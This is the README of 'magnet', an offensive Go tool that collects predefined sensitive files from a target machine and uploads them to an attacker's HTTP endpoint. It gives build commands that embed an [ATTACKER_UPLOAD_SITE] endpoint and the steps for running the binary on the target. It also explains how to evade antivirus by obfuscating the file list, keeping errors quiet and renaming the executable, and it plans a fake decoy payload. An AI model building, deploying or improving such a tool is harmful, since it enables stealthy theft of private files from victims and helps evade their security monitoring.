<div align=center>
  <h1>magnet</h1>
  <pre>🧲⚡
  <strong>Grab interesting files from remote</strong><br>
  The library is built to fetch predefined files of interest from a target devices. It assumes that an HTTP endpoint is listening when the program wise launched.

  <b><i>Cross-platform</i><b>
  <b><i>Stealth</i><b>
  <b><i>Portable</i><b>
  </pre>
</div>



## Usage

### Inject `magnet` in your Go program

### Standalone

**At compilation time** you need to specify:
* ***The remote endpoint***, where juicy files are uploaded
* ***The Juicy files***, list of files you want to grab
* ***The target os***, to fit the target (between: `windows`, `darwin`, `linux`)

### Shorcut



To build `magnet` binary in one step:
```shell
make build.magnet.linux $FILE $ENDPOINT
# or build.magnet.windows or build.magnet.darwin
```

Then on target machine:
```shell
./magnet #or magnet.exe
```

### Compile on your own

The compilation line looks like this:
```shell
export FILES=$(cat samples/linux_juicy_files_obfuscated.txt)
export KEY=thisismykey 
export ENDPOINT=http://[ATTACKER_UPLOAD_SITE]
GOOS=linux GOARCH=amd64 go build -ldflags "-X 'main.FileList=$FILES' "-X 'main.Key=$KEY' -X 'main.Endpoint=$ENDPOINT'" magnet.go
```



### Obfuscation/Encryption

To avoid detection systems, as we are seeking for sensitive files, **the different files we want to grab must not be in clear text within the binary** . Hence it used basic encryption with the key to decrypt embedded in binary. *(The aim is only to avoid AV and Detection system not to have strong encryption scheme)*

To build the obfuscated list:
```shell
cat [FILE] | lobfuscator $KEY > obfuscated.txt
```

### Notes

* For the remote endpoint , I suggest you to use the `/push` endpoint of a [`gitar`](https://github.com/ariary/gitar) listener
* The software is built to be stealthy hence:
  * error handling is not verbose (hidden flag to get more verbosity `-thisisdebug`)
  * I suggest to overwrite usage string in `magnet.go` to fit your attack scenario
  * rename `magnet` executable

## To do

* Include a fake payload that will also be run to fake an attacking scenario (example update, etc)
* Handle directories
